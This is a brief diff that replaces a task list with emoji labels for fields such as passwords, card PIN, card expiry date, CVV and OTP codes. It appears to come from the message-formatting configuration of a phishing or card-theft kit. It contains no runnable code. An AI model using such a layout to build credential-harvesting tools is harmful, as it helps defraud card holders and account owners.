@@ -1,4 +1,13 @@
-### TASKS ###
-    1. Blacklist
-    2. Routes
-    3. Logs
+  redPoint: U+1F534
+  bluePoint: U+1F535
+  fire: U+1F525
+  Check: U+2705
+  User: U+1F465
+  Pass: U+1F512
+  Number: U+1F4F2
+  Email: U+1F4E7
+  pEmail: U+1F513
+  cardPIN: U+1F4B3
+  cardFecha: U+1F4C5
+  cardCVV: U+2B50
+  vOTP: U+1F4A3
